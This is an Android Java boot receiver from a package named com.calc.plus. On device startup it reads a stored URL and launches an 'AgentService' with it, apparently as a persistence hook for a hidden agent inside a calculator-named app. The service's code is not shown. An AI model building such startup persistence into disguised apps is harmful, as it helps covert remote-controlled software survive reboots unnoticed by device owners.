package com.calc.plus;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
public class BootReceiver extends BroadcastReceiver {
    @Override public void onReceive(Context ctx, Intent i) {
        String url = ctx.getSharedPreferences("cfg", Context.MODE_PRIVATE).getString("url", "");
        if (url.isEmpty()) return;
        Intent s = new Intent(ctx, AgentService.class).putExtra("url", url);
        if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(s);
        else ctx.startService(s);
    }
}
